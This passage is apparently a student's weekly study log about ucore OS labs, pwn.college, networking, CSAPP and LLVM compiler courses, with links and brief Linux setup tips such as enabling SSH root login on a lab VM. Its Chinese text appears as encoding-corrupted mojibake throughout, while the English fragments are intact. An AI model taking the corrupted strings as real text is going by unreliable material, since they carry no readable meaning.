&quot;&#123;BasedOnStyle: Chromium, IndentWidth: 4&#125;&quot;</code><br><a href="https://blog.csdn.net/softimite_zifeng/article/details/78357898">clang-formatå‚æ•°</a> </li></ul></li></ul><h3 id="ç¬¬äºŒåäº”å‘¨-12-27-1-2"><a href="#ç¬¬äºŒåäº”å‘¨-12-27-1-2" class="headerlink" title="ç¬¬äºŒåäº”å‘¨: 12/27-1/2"></a>ç¬¬äºŒåäº”å‘¨: 12/27-1/2</h3><ul><li>å‘¨ä¸€, ç»å…¸å†ç°, æˆ‘æœç„¶æ²¡æœ‰çœ‹æ‡‚åœ°å€æ˜ å°„çš„å››ä¸ªé˜¶æ®µ, åˆé‡æ–°çœ‹äº†ä¸€æ¬¡ucoreè‡ªå¸¦çš„ä¸€ä¸ªè®¾ç½®å¥½çš„é¡µç›®å½•è¡¨å’Œç›¸åº”çš„é¡µè¡¨<br>åˆæŠ˜è…¾äº†åŠå¤©</li><li>è£…äº†ä¸€ä¸ªinfoåŒ…, æš‚æ—¶åªçŸ¥é“èƒ½çœ‹info ld</li><li><code>make grade</code>åœ¨è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹é‡Œå‡ºé”™äº†, è¯¶æƒ³çœäº‹åˆæœ‰ç‚¹éº»çƒ¦çš„ä¸œè¥¿</li><li>å¼„äº†ä¸€ä¸ªå¤šå°æ—¶, åšå®¢æƒ³åŠ ä¸Šæ±‡ç¼–ä»£ç é«˜äº®, æ²¡æœ‰æˆåŠŸ, å’ŒTyporaçš„é…åˆä¸æ˜¯å¾ˆå¥½, é¸½äº†</li><li>Dirty COWçš„ç½‘ç«™ä¸Šæœ‰ä¸ªä¸œè¥¿å¥½æœ‰è¶£<ul><li>How do I uninstall Linux? Please follow <a href="https://youtu.be/MZrdrfdAl44?t=14">these</a> instructions. </li></ul></li><li>VMwareå¯¹äºåœ¨è™šæ‹Ÿæœºä¸­é€‰ä¸­çš„æ–‡æœ¬ä¼šè‡ªåŠ¨å¤åˆ¶åˆ°å®¿ä¸»æœºä¸­</li><li>å‘¨å››, ucoreå¼€å§‹å¿«ä¸€ä¸ªæœˆäº†, è¿›å±•åˆ°äº†Lab6</li><li>æŠ˜è…¾äº†å¿«ä¸€ä¸ªå°æ—¶, ç»“æœå‘ç°éœ€è¦update lab5çš„ä»£ç æ‰èƒ½æ­£ç¡®make qemu, ä¹Œé±¼å­â€¦â€¦â€¦ä¸ºä»€ä¹ˆæ€»åœ¨è¿™ç§æ— æ„ä¹‰çš„äº‹æƒ…ä¸Šæµªè´¹æ—¶é—´<ul><li>å‘¨äº”ä¸‹åˆä¸‰ç‚¹, äººå·²è¢«æ°”æ™•, exercise0æ€ä¹ˆæ”¹éƒ½ä¸è¡Œ, é‡æ–°cloneäº†è‚–ä½¬çš„lab6, ç»äº†</li><li>å‘ç°è‚–ä½¬æ˜¯æŠŠå‡ºé”™çš„é‚£ä¸€å¥ç›´æ¥æ³¨é‡Šäº†, æœªæ›¾è®¾æƒ³çš„é“è·¯</li></ul></li><li>å…ƒæ—¦å½“å¤©, ä¸è¿›è¡Œæ ¼å¼åŒ–çš„åˆå¹¶å°±æ˜¯èˆ’æœ &amp;&amp; å°è¯•clashå†æ¬¡å¤±è´¥, ä¸‹æ¬¡ä¸å¼„äº†</li><li>è£…äº†ä¸€ä¸ªapt install <a href="https://graphviz.org/">graphviz</a>, an open source graph visualization software</li><li>æ·±å—ç¿»è¯‘ç‰ˆæ‰€å®³, signaling processç›´æ¥å«åšä¿¡å·è¿›ç¨‹</li></ul><h3 id="ç¬¬äºŒåå…­å‘¨-1-3-1-9"><a href="#ç¬¬äºŒåå…­å‘¨-1-3-1-9" class="headerlink" title="ç¬¬äºŒåå…­å‘¨:1/3-1/9"></a>ç¬¬äºŒåå…­å‘¨:1/3-1/9</h3><ul><li><p>å¼€å§‹lab8</p></li><li><p>print working directory = pwd</p></li><li><p><a href="https://blog.csdn.net/weixin_40204595/article/details/81109644?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&utm_relevant_index=1">Cè¯­è¨€å®å®šä¹‰ä¸­ ## å’Œ#çš„ä½œç”¨</a> </p></li><li><p>magic numbers</p></li><li><p>è¿™ä¸ªhighlightjs+hexoæˆ‘ä¸æ”¹å˜ä¸€ä¸‹æ–‡ä»¶ä»–å°±ä¸åŠ¨é…ç½®äº†, æå¾—ä»£ç å—ç™½åº•ç™½å­—, è¿˜å¾—æ‰‹åŠ¨åœ¨æ¯ä¸ªæ–‡ä»¶éƒ½åŠ ä¸Šä¸€ä¸ªç©ºæ ¼.</p></li><li><p>do {â€¦} while (0) åœ¨å®å®šä¹‰ä¸­çš„ä½œç”¨: èƒ½å¤Ÿæ­£ç¡®çš„è®©å¤šæ¡è¯­å¥æŒ‰æˆ‘ä»¬çš„æ„æ„¿å·¥ä½œ.</p></li><li><p>å°è¯•äº†ä¸€ä¸‹sshè¿æ¥è™šæ‹Ÿæœº, åªè¦æ‰§è¡Œä¸€ä¸‹å‡ æ¡å‘½ä»¤å³å¯, ä½¿ç”¨äº†ä¸€ä¸‹XShell, è¦å¼¹å‡ºqemuçš„çª—å£è¿˜è¦è£…ä¸œè¥¿â€¦â€¦</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">apt-get update<br>apt-get install openssh-server<br>systemctl <span class="hljs-built_in">enable</span> ssh.service<br>vim /etc/ssh/sshd_config <span class="hljs-comment"># æ”¹æˆå…è®¸rootç”¨æˆ·ç™»å½•</span><br>/etc/init.d/ssh restart<br></code></pre></div></td></tr></table></figure></li><li><p>è¦ç”¨understandè®°å¾—è¦æ³¨æ„ç¼–ç é—®é¢˜ä»¥åŠåŠæ—¶é‡æ–°åˆ†ææ‰€æœ‰æ–‡ä»¶(windowsé»˜è®¤GBKç¼–ç </p></li><li><p>å‘¨å…­, è™½ç„¶åœ¨å¤ä¹ å‘¨, ä½†æ˜¯é©¬ä¸Šå°±è¦å®Œæˆucoreäº†. <strong>å‘¨å¤©, ucoreå®Œæˆ</strong> </p></li><li><p>è£…ä¸Šäº†ahkè¯­æ³•é«˜äº®, ç¡¬æ˜¯æ•´äº†ä¸ªå°è„šæœ¬</p></li></ul><hr><h2 id="å¼€å§‹å¯’å‡-pwn-college-è®¡ç½‘"><a href="#å¼€å§‹å¯’å‡-pwn-college-è®¡ç½‘" class="headerlink" title="å¼€å§‹å¯’å‡(pwn.college+è®¡ç½‘)"></a>å¼€å§‹å¯’å‡(pwn.college+è®¡ç½‘)</h2><h3 id="ç¬¬äºŒåä¸ƒå‘¨-1-10-1-16"><a href="#ç¬¬äºŒåä¸ƒå‘¨-1-10-1-16" class="headerlink" title="ç¬¬äºŒåä¸ƒå‘¨:1/10-1/16"></a>ç¬¬äºŒåä¸ƒå‘¨:1/10-1/16</h3><ul><li>gVimæ˜¯vimçš„ä¸€ç§, æŒ‡GUI Vim, è¿˜æœ‰å…¶ä»–çš„æ¨¡å¼å¯ä»¥é€šè¿‡ vim -å‚æ•° æ¥æŒ‡å®š</li><li>è€ƒè¯•å‘¨, çœ‹äº†ä¸€ç‚¹pwn.collegeçš„YouTubeè§†é¢‘, ä»‹ç»è§†é¢‘æ„Ÿè§‰è¿˜æŒºå¤šçš„, æ˜¯æ—¶å€™å†å†™ä¸€ç¯‡blogäº†</li><li>å¯¹äº†, æ¯å¤©è¦å¤ä¹ ä¸€ç‚¹å‰é¢çš„ä¸œè¥¿, ä¸ç„¶åˆ°æ—¶å€™å°±ç­‰äºé‡æ–°çœ‹äº†</li><li>è€ƒå®Œäº†, è€ƒ å®Œäº†, è€ƒ å®Œäº†, 16å·å¼€å§‹ä¸€ç‚¹è®¡ç®—æœºç½‘ç»œ, è®¡ç®—æœºç³»ç»Ÿ, å’Œpwn.college<ul><li>æ‰¾åˆ°äº†è®¡ç®—æœºç½‘ç»œä¹¦é…å¥—ç½‘ç«™: <a href="https://media.pearsoncmg.com/aw/ecs_kurose_compnetwork_7/cw/">éƒ¨åˆ†èµ„æº</a>ä»¥åŠ<a href="http://gaia.cs.umass.edu/kurose_ross/index.php">ä¸»é¡µ</a>, ä»¥åŠåœ¨Z-libraryä¸Šæ‰¾åˆ°äº†è‹±æ–‡ç¬¬å…«ç‰ˆ.</li><li><a href="http://gaia.cs.umass.edu/kurose_ross/eighth.php">ç¬¬å…«ç‰ˆçš„æ”¹åŠ¨</a> </li><li>åˆ«äººçš„è®¡ç½‘<a href="https://blog.csdn.net/wwj17647590781/category_11065625.html?spm=1001.2014.3001.5482">ç¬”è®°</a> </li><li>ç ”ç©¶ç¬”è®°è¦æ€ä¹ˆå†™ç”¨äº†ä¸€ç‚¹æ—¶é—´, å¹²ç‚¹åˆ«çš„å»äº†</li></ul></li></ul><h3 id="ç¬¬äºŒåå…«å‘¨-1-17-1-23"><a href="#ç¬¬äºŒåå…«å‘¨-1-17-1-23" class="headerlink" title="ç¬¬äºŒåå…«å‘¨:1/17-1/23"></a>ç¬¬äºŒåå…«å‘¨:1/17-1/23</h3><ul><li><strong>17: çœ‹è®¡ç½‘, æ˜å¤©å¼€å§‹pwn.college</strong> </li><li><strong>18:</strong> æ‰¾åˆ°äº†ä¸€ä¸ªä¸‹è½½Githubå•ä¸ªæ–‡ä»¶å¤¹çš„<a href="https://downgit.github.io/#/home">ç½‘ç«™</a>, ä»¥åŠæŠŠtree/masteræ›¿æ¢ä¸º<strong>trunk</strong>. ç„¶åç”¨ï¼šsvn checkout [source]</li><li>è®¡ç½‘å¼€å§‹ç¬¬äºŒç« , ç¬¬ä¸€ç« ä¸œè¥¿ä¹ŸçœŸå¤Ÿå¤šçš„</li><li>çœ‹ä¸€ç‚¹concurrent programingâ€¦.è¿˜æœ‰å…ˆåå…³ç³», å…ˆçœ‹network programmingâ€¦å‘ƒå‘ƒ, è¿˜æ˜¯çœ‹system I/Oå§â€¦</li><li><strong>19:</strong> <a href="https://www.cnblogs.com/zy691357966/category/827251.html">CSAPPç¬”è®°</a>å…¨markdownçš„ç‹ äºº</li><li><a href="https://www.jianshu.com/p/9268ac2c8e5f">æ©ç </a>æ˜¯ä¸ªå•¥, Youtube<a href="https://www.edunews.net.cn/2020/hlw_0622/11069.html">å¿«æ·é”®</a> </li><li>çœ‹äº†CSAPPåå‡ ç« å’Œpwn.college. </li><li><strong>20:</strong> <a href="http://blog.chinaunix.net/uid-9474419-id-400907.html">/dev/ttyå’Œptyç­‰ç­‰</a> </li><li>è¿˜åœ¨ELFæ ¼å¼ä¸­æŒ£æ‰. </li><li><strong>21:</strong> Xshellçš„<a href="https://www.kali.org/docs/general-use/python3-transition/">è­¦å‘Šä¿¡æ¯</a>, ä¸æƒ³çœ‹, åªè¦<code>touch ~/.hushlogin</code>è¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥éšè—äº†, åˆ é™¤ååˆæ˜¾ç¤º</li><li>çœ‹äº†ä¸€ç‚¹computer networking</li><li>manæ‰‹å†Œè¿˜èƒ½<a href="https://www.cnblogs.com/chao1118/p/3715523.html">è£…ä¸­æ–‡</a>, ä¸æƒ³æŠ˜è…¾äº†, å®‰æ’äº†<code>apt install manpages-dev</code>å¯ä»¥æŸ¥çœ‹ç³»ç»Ÿè°ƒç”¨</li><li><strong>22:</strong> ccå‘½ä»¤æœ€ç»ˆé“¾æ¥åˆ°gcc, è¿™æ˜¯ä¸ºäº†å‘åå…¼å®¹</li><li>è¿pwn.collegeæ…¢çš„ä¸€æ‰¹, ä¹Ÿä¸ºäº†è®¡ç®—æœºç³»ç»Ÿè¯¾è£…ä¸ªUbuntuäº†, å†å¼„ä¸ªclash</li><li>è§è¯†åˆ°äº†å¥½å¤šæ–°çš„å‘½ä»¤, linuxæœ‰å¤šçš„æ“ä½œå°±å†™åœ¨Linuxä½¿ç”¨é‡Œå§.<ul><li>å¹²è„†æŠŠé‚£ä¸ªå¼„æˆæ¸…å•, ç„¶åå…·ä½“ç»†èŠ‚å†™åœ¨æ¯ä¸ªWPé‡Œå°±å¯ä»¥äº†</li><li>runoobä¸Šçš„å‘½ä»¤å¤§å…¨æ¯å¤©çœ‹ä¸€ç‚¹å¾—äº†, <strong>è‡³å°‘æ··ä¸ªçœ¼ç†Ÿ</strong> </li></ul></li><li><strong>23:</strong> ç»ˆäº, åœ¨ubuntuå¼„å¥½äº†clash, æ·±æ·±æ„Ÿåˆ°åŸç†ä¸€ä¸ªéƒ½ä¸çŸ¥é“åªä¼šæ“ä½œè½¯ä»¶çš„ç—›è‹¦â€¦.<a href="http://t.zoukankan.com/huang-xiang-p-13922394.html">link</a> </li><li>çœ‹è®¡ç½‘</li></ul><h3 id="ç¬¬äºŒåä¹å‘¨-1-24-1-30"><a href="#ç¬¬äºŒåä¹å‘¨-1-24-1-30" class="headerlink" title="ç¬¬äºŒåä¹å‘¨ 1/24-1/30"></a>ç¬¬äºŒåä¹å‘¨ 1/24-1/30</h3><ul><li><strong>24:</strong> ç»§ç»­å¾ˆå¤šçš„è®¡ç½‘å’Œä¸€ç‚¹pwn.college</li><li><strong>25:</strong> ASCIIç ä¸­çš„<a href="https://en.wikipedia.org/wiki/C0_and_C1_control_codes#C1_controls">æ§åˆ¶å­—ç¬¦</a>å°±æ˜¯æŒ‰é”®ç›˜ä¸Šçš„Ctrl+å­—æ¯ç¬¦å·æ¥æ‰“å‡ºçš„,<br><strong>Caret(^) notation</strong> is a notation for unprintable control characters in ASCII encoding<br>The actual meaning or interpretation of the individual control-codes is not prescribed by the caret notation, and although the ASCII specification does give names to the control-codes, it does not prescribe how software should respond to them.</li><li>å­¦äº†ä¸€æ³¢screen, <del>ä¹Ÿä¸çŸ¥é“æœ‰å•¥ç”¨å°±æ˜¯äº†â€¦</del> , çœŸé¦™.</li><li>å¿«æ·é”®æ²¡å®Œæ²¡äº†äº†, <strong>ä¸€ä¸ªç»ˆç«¯è¿˜æœ‰è¿™ä¹ˆå¤š</strong> </li><li>pwn.collegeåšåˆ°äº†(?)</li><li><strong>26:</strong> ä¸€ç‚¹ç‚¹pwn.collegeå’Œç§‘ç›®å››</li><li><strong>27:</strong> pwn.college+computer networking</li><li>çœ‹äº†ä¸€ç¯‡PIPE&amp;FIFOçš„æ–‡ç« , çœ‹ä¸ä¸‹å»äº†è¯çœŸçš„å¤ªå¤šäº†, ä¹Ÿæ˜¯ä½©æœä¸€ç¯‡åšå®¢éœ€è¦è¿™ä¹ˆå¤šå­—çš„. <strong>è¿˜æ˜¯linux manualç®¡ç”¨</strong>.</li><li><strong>28-30</strong> çœ‹è®¡ç½‘å’Œpwn.college.</li></ul><h3 id="ç¬¬ä¸‰åå‘¨-1-31-2-6"><a href="#ç¬¬ä¸‰åå‘¨-1-31-2-6" class="headerlink" title="ç¬¬ä¸‰åå‘¨ 1/31-2/6"></a>ç¬¬ä¸‰åå‘¨ 1/31-2/6</h3><ul><li>1/31: é™¤å¤•å¤œ, è¿˜åœ¨çœ‹è®¡ç½‘. çœ‹çš„å±å®æœ‰ç‚¹æ…¢.</li><li>2/1-2/2: è®¡ç½‘+æ˜¥èŠ‚.</li><li>2/3-4: çœ‹ä¹¦, è¿›åº¦315/775</li><li>2/5: è¿ç€çœ‹äº†å‡ ä¸ªå°æ—¶çœ‹ä¸ä¸‹å»äº†, ä¸é‡è¦çš„ç›´æ¥è·³è¿‡ä¸çœ‹äº†.</li></ul><h3 id="ç¬¬ä¸‰åä¸€å‘¨-2-7-2-13"><a href="#ç¬¬ä¸‰åä¸€å‘¨-2-7-2-13" class="headerlink" title="ç¬¬ä¸‰åä¸€å‘¨: 2/7-2/13"></a>ç¬¬ä¸‰åä¸€å‘¨: 2/7-2/13</h3><ul><li>2-8: ä¸‹åˆäº”ç‚¹, å‰å…­ç« çœ‹å®Œ. å·©å›ºä¸‹çŸ¥è¯†(é™¤äº†ç®—æ³•)</li><li>2-9-13: ç»ˆäºçœ‹å®Œäº†, (æ‘¸:fish:äº†ä¸€å¤©)</li><li>å¼€å§‹pwn.college!</li></ul><h3 id="ç¬¬ä¸‰åäºŒå‘¨-2-14-2-20"><a href="#ç¬¬ä¸‰åäºŒå‘¨-2-14-2-20" class="headerlink" title="ç¬¬ä¸‰åäºŒå‘¨: 2/14-2/20"></a>ç¬¬ä¸‰åäºŒå‘¨: 2/14-2/20</h3><ul><li>14: å‘ç°è¦è‡ªå·±å†™æ±‡ç¼–ä»£ç , ä¹‹å‰çœ‹è¿‡çš„ä¸€éƒ¨åˆ†è¿˜ç®—ç”¨åˆ°äº†, è¿˜å¥½åšäº†ç¬”è®°ä¸ç„¶å’Œæ²¡çœ‹ä¸€æ ·. ä»¥å‰éƒ½æ˜¯çœ‹ç°æˆçš„éƒ½æ²¡æœ‰è‡ªå·±å†™è¿‡.</li><li>python3.8ç‰¹æ€§: <a href="https://zhuanlan.zhihu.com/p/90992431">Assignment expressions</a>: <code>:=</code>å’Œ<code>=</code>æ˜¯è¡¥å……å…³ç³»å¹¶ä¸æ˜¯æ›¿æ¢å…³ç³»</li><li><a href="https://cloud.tencent.com/developer/ask/106533">deadbeefæ¸Šæº</a> å’Œ<a href="https://en.wikipedia.org/wiki/Hexspeak">Hexspeak</a>æœ‰å…³ç³». è¿™ä¸ªHexspeakä¹ŸæŒºæœ‰æ„æ€, æ˜¯ç”¨16è¿›åˆ¶æ•°å­—æ¥è¡¨ç¤ºè‹±æ–‡å•è¯, å¯ç”¨æ¥ç¼–é­”æ•°.</li><li>15:  Linuxçš„typoraé‡ŒåŒå‡»æˆ–é€‰ä¸­ä¼šè‡ªåŠ¨åˆ é™¤æ–‡å­—å±…ç„¶æ˜¯è¿™ä¸ª<a href="https://blog.csdn.net/litao31415/article/details/51082530">åŸå› </a> </li><li>è‡ªå·±äº²è‡ªåŠ¨æ‰‹å†™èµ·æ±‡ç¼–ä»£ç æ‰å‘ç°è¿™ä¹ˆå¤šç»†èŠ‚æ²¡æœ‰æ³¨æ„åˆ°, è¦æŠ“ç´§æ—¶é—´ç»ƒç»ƒäº†, è¿™ä¸Šé¢çš„é¢˜ç›®è¿˜éƒ½æ¯”è¾ƒåŸºç¡€å˜.</li><li>16: è¿˜åœ¨pwn.college</li><li>Undefined Behavior -&gt; <a href="https://riptutorial.com/cplusplus/topic/1812/undefined-behavior">here</a> and <a href="https://blog.llvm.org/2011/05/what-every-c-programmer-should-know.html">here</a> <ul><li>signed overflow (which is undifined behavior) -&gt; <a href="https://www.airs.com/blog/archives/120">here</a> and <a href="https://stackoverflow.com/questions/18195715/why-is-unsigned-integer-overflow-defined-behavior-but-signed-integer-overflow-is">stackoverflow</a> </li></ul></li><li>17: ä¸€ç‚¹ç‚¹çš„pc, shellcode injectionåˆæœ‰å¥½å¤šçš„èµ„æ–™å¼•ç”¨å’Œè§†é¢‘, å…¨çœ‹å®Œå¾—å‡ å¤©æ—¶é—´(ä¸€å¤©åŠå°±çœ‹å®Œäº†)</li><li>18: çœ‹å®Œäº†pcçš„shellcode moduleè§†é¢‘, å¼•ç”¨æ–‡ç« çœ‹ä¸ªä¸¤ç¯‡å°±ç»“æŸäº†.</li><li>å¤ä¹ æ“ä½œç³»ç»Ÿ. â€¦.åˆ°åº•éœ€è¦ä¸€ä¸ªä½•ç­‰åºå¤§çš„åŸºç¡€çŸ¥è¯†ä½“ç³»å•Šâ€¦â€¦(tmæ‹–äº†ä¸¤å¤©æ‰è¦å¼€å§‹)</li><li>çœ‹äº†ä¸€ç‚¹disk imageçš„ç›¸å…³wikipedia: <a href="https://en.wikipedia.org/wiki/Disk_image">disk image</a> | <a href="https://en.wikipedia.org/wiki/Loop_device">loop deivce</a> | <a href="https://en.wikipedia.org/wiki/Device_file#Block_devices">device file</a> <ul><li>è¿˜æœ‰Disk imageå’Œoptical disc imageåŒºåˆ«:<br>A disk image, in computing, is a computer file containing the contents and structure of a disk volume <strong>or of an entire data storage device</strong><br>An optical disc image <strong>is a disk image</strong> that contains everything that would be written to an <strong>optical disc</strong> </li><li>Once youâ€™ve downloaded an ISO Image you can mount it as a loopback device. </li><li>It may be used to install an operating system onto a file system without repartitioning a disk.</li></ul></li><li>19-20: å›å­¦æ ¡å‡†å¤‡ä¸­, ä¸çŸ¥é“å­¦äº†å•¥, è‡³å°‘æ˜¯å¤ä¹ äº†ucore</li></ul><h2 id="å¼€å­¦äº†-pc-ç¼–è¯‘åŸç†"><a href="#å¼€å­¦äº†-pc-ç¼–è¯‘åŸç†" class="headerlink" title="å¼€å­¦äº†!(pc+ç¼–è¯‘åŸç†)"></a>å¼€å­¦äº†!(pc+ç¼–è¯‘åŸç†)</h2><h3 id="ç¬¬ä¸‰åä¸‰å‘¨-2-21-2-27"><a href="#ç¬¬ä¸‰åä¸‰å‘¨-2-21-2-27" class="headerlink" title="ç¬¬ä¸‰åä¸‰å‘¨ : 2/21-2/27"></a>ç¬¬ä¸‰åä¸‰å‘¨ : 2/21-2/27</h3><ul><li>21:å¤ä¹ CS143, ä»Šå¤©æˆ–è®¸èƒ½å¤ä¹ å®Œ. <ul><li>ç­”æ¡ˆæ˜¯ä¸èƒ½, <strong>è¯¶æ˜å¤©éšä¾¿çœ‹çœ‹bisonçš„ä¸œè¥¿å§. ç„¶åå†çœ‹çœ‹cscd70, å†ç„¶åçœ‹çœ‹LLVM IR Pass</strong> </li></ul></li><li>22: å¦‚ä¸Šæ‰€è¿°, ä¸»è¦çœ‹äº†CSCD70. ä»Šå¤©æ²¡æœ‰è¯¾.</li><li><a href="https://en.wikipedia.org/wiki/Compiler#Three-stage_compiler_structure">What is complierâ€™s front end</a> åœ¨è¯¾ä»¶é‡Œæ‰¾åˆ°äº†, ä¸€å¼€å§‹è¿˜å»WiKiä¸ŠæŸ¥.</li><li>23: ç»§ç»­CSCD70(çœ‹å®Œäº†lecture 1)</li><li>an <strong>induction variable</strong> is a variable that gets increased or decreased by a fixed amount on every iteration of a loop or is a linear function of another induction variable.</li><li>ä¸çŸ¥é“è¯¥ä¸è¯¥çœ‹è§†é¢‘, æ„Ÿè§‰ä¼˜ç‚¹åœ¨äºèƒ½ç»ƒä¹ ä¸€ç‚¹å¬åŠ›ä»¥åŠå¬ä¸€äº›é—®ç­”, ç¼ºç‚¹çš„è¯ä¼šæ…¢ä¸€äº›, ä¸è¿‡è¿™ä¹ˆä¸€æƒ³å€’æ˜¯åˆ©å¤§äºå¼Šäº†.</li><li>24: ç»§ç»­CSCD70. ç¬¬ä¸‰ä¸ªè§†é¢‘çœ‹äº†ä¸€åŠå¤š</li><li><a href="https://en.wikipedia.org/wiki/Number_sign#Mathematics">Number sign</a> in <code>#def</code>. It turns out to be the mathematic sign.</li><li>25: çœ‹å®Œç¬¬ä¸‰ä¸ª. æŸ¥äº†live variable analysisçš„ä½œç”¨.</li><li>è¿˜æŸ¥äº†è®¡ç®—æœºç³»ç»Ÿå°ç­è¯¾çš„ç¬¬äºŒä¸ªé—®é¢˜: ä¸åŒæ“ä½œç³»ç»Ÿ, ä¸åŒç¼–è¯‘å™¨, ä¸åŒå¤„ç†ç³»æ¶æ„å¯¹ç”Ÿæˆç›®æ ‡æ–‡ä»¶çš„è¿‡ç¨‹æœ‰ä»€ä¹ˆå½±å“.<ul><li>gccç”±cc1, as, ldä¸‰ä¸ªéƒ¨åˆ†ç»„æˆ, å¦å¤–ä¸€ä¸ªllvmæŠŠcc1æ¨¡å—åŒ–ä¸ºä¸‰ä¸ªéƒ¨åˆ†, ç„¶åæ­£å¸¸æ±‡ç¼–, é“¾æ¥æ—¶å¯é€‰optimization.</li><li>Clangåªæ˜¯ä¸€ä¸ªfront end.</li></ul></li><li>26-27: æŸ¥RFCä¸­çš„ipv4å’Œipv6, ä¸çŸ¥é“åœ¨å“ªé‡Œæœ‰å†™. è¿˜æœ‰C99å¾…çœ‹</li><li>å¤ä¹ è¡¥å……linuxå‘½ä»¤(æ“ä½œç³»ç»Ÿå°ç­è¯¾)</li><li>æœ‰ç©ºçœ‹ä¸‹IBMç½‘ç«™, ä¸Šé¢å¥½åƒæŒºå¤šæœ‰ç”¨çš„åšå®¢èµ„æ–™å•¥çš„..</li><li>system programming in c or c++? -&gt; <a href="https://darkbears.com/blog/why-c-continues-to-the-preferred-systems-programming-language/">link</a> </li><li>è¿™ä¸¤å¤©éƒ½åœ¨åšè®¡ç½‘å®éªŒ, è¦å†™c99ç¨‹åºå’Œæµ‹è¯•ç¨‹åº, è¾¹ç¿»æ–‡æ¡£ç¼–å†™æ˜¯æ…¢äº†ç‚¹. ä¸å¦‚è¯´æˆ‘æ•²ä»£ç å¥½åƒä¸€ç›´éƒ½æ…¢äº†ç‚¹â€¦..</li></ul><h3 id="ç¬¬ä¸‰åå››å‘¨-2-27-3-6"><a href="#ç¬¬ä¸‰åå››å‘¨-2-27-3-6" class="headerlink" title="ç¬¬ä¸‰åå››å‘¨: 2/27-3/6"></a>ç¬¬ä¸‰åå››å‘¨: 2/27-3/6</h3><ul><li>27-1: <a href="https://stackoverflow.com/questions/9257085/how-can-i-scroll-back-in-gdbs-command-window-in-the-tui-mode">How can I scroll back in GDBâ€™s command window in the TUI mode?</a>  </li><li><a href="https://vimhelp.org/cmdline.txt.html#%5Brange%5D">vim range èŒƒå›´</a> and <a href="https://vimhelp.org/usr_10.txt.html#10.3">this</a> </li><li>debugging Infomation: <a href="https://unix.stackexchange.com/questions/219550/what-is-linux-native-debugging-symbols-format">native format</a> | GCC 4.8 change to DWARF4 | -g -gstabs -gxcoff -gstabs+ | peda</li><li>2-4: è£…dockerçœ‹è§†é¢‘å’Œpwn.college.<ul><li>dockerçš„DNSè§£æé”™è¯¯æ— æ³•<code>sudo apt-get update</code>, <a href="https://robinwinslow.uk/fix-docker-networking-dns">è§£å†³åŠæ³•</a> (è¿˜æ˜¯ä¸å¦‚æ¢æºæœ‰ç”¨) .</li><li>çœ‹äº†å‡ èŠ‚å¤šä¼¦å¤šå¤§å­¦æ²¹ç®¡ä¸Šçš„è‹±æ–‡è§†é¢‘è¿˜æ˜¯æŒºæœ‰æ„æ€çš„, å°±å½“é”»ç‚¼äº†ä¸€ä¸‹å¬åŠ›å§, å€’å›æ¥çœ‹å“ˆå·¥å¤§è§†é¢‘. compilerçš„front endçœ‹çš„æŒºç´¯çš„, ä¸è¿‡ä¼˜åŒ–éƒ¨åˆ†çœ‹èµ·æ¥æ„ä¹‰æ›´æ˜äº†ä¸€äº›, åŠªåŠ›ä¸€ä¸‹çœ‹ä¸‹ä¸¤ä¸‰å‘¨å¼„å¾—å®Œä¸.</li></ul></li><li>5: å“ˆå·¥å¤§çš„è§†é¢‘ç›¸å½“ç´§å‡‘, ä¸çŸ¥é“å†…å®¹æœ‰æ²¡æœ‰å°‘ä¸€äº›. ä¸»è¦æ˜¯è‹±æ–‡æ²¡æ³•ä¸¤å€é€Ÿ, è¦ä¸ç„¶å°±å¬ä¸æ‡‚äº†â€¦..<ul><li>What is orchestration? -&gt; <a href="https://en.wikipedia.org/wiki/Orchestration_(computing)">WiKipedia</a> </li><li>What is the container? -&gt; <a href="https://medium.com/@saschagrunert/demystifying-containers-part-i-kernel-space-2c53d6979504">here</a> </li><li>CMake vs. Make , and What is CMake? <a href="https://www.incredibuild.com/blog/cmake-vs-make">link</a> </li></ul></li><li>6: æœ‰ç‚¹é¢“åºŸ.<ul><li>åœ¨çœ‹llvmçš„æ–‡æ¡£, è¦ä¸ç„¶è¿™ä¸ªè¿‡ç¨‹æ˜¯ä¸€æ— æ‰€çŸ¥â€¦.. <a href="http://www.aosabook.org/en/llvm.html">link</a> </li><li><a href="https://en.wikipedia.org/wiki/Just-in-time_compilation#Design">JIT</a> and AOT(self-evident) | <a href="https://en.wikipedia.org/wiki/First-class_citizen">first class language</a>?? | Archive file | </li></ul></li></ul><h3 id="ç¬¬ä¸‰åäº”å‘¨-3-7-3-13"><a href="#ç¬¬ä¸‰åäº”å‘¨-3-7-3-13" class="headerlink" title="ç¬¬ä¸‰åäº”å‘¨: 3/7-3/13"></a>ç¬¬ä¸‰åäº”å‘¨: 3/7-3/13</h3><ul><li>7: <a href="https://devopsonwindows.com/what-makes-a-build-system/">build system</a> | åªèƒ½å»çœ‹åœ¨çº¿çš„llvmæ‰‹å†Œäº†.è£…å¥½çš„dockerè¿˜æ˜¯åˆ«å»æ‰§è¡Œunminimizeè¿™ç§å‘½ä»¤äº†.</li><li>8: dockerçš„ç›¸å…³å‘½ä»¤.</li><li>9: è®¡ç½‘å®éªŒä¸­. Return/Enter Key | Wiresharkæ‰‹å†Œ | æ¯æ—¥å•è¯è¿›è¡Œä¸­ | </li><li>10:ä»€ä¹ˆç¥å¥‡è®¡ç½‘, æ°´è¿‡å¾—äº†, é™¤äº†æµªè´¹æ—¶é—´æ²¡å•¥æ„ä¹‰.</li><li>11: å•Šå•Šå•Šæˆ‘è¦å­¦llvm, æ€ä¹ˆæ„Ÿè§‰å‰å‡ å¤©æ•ˆç‡è¿™ä¹ˆä½å‘¢.<ul><li>çœ‹äº†clangå’Œllvmæ–‡æ¡£(æ¯”å¦‚-emit-code), äº†è§£äº†ä¸€ä¸‹å¦‚ä½•å†™å‡ºä¸€ä¸ªpass. cmakeå†™æ³•å¾…çœ‹.</li><li>æŒ‡å¯¼ä¹¦é‡Œé¢çš„clangè¿˜æœ‰ä¼˜åŒ–é€‰é¡¹, ä¸æ˜ç™½è¿™æ˜¯åœ¨æ•´å•¥, 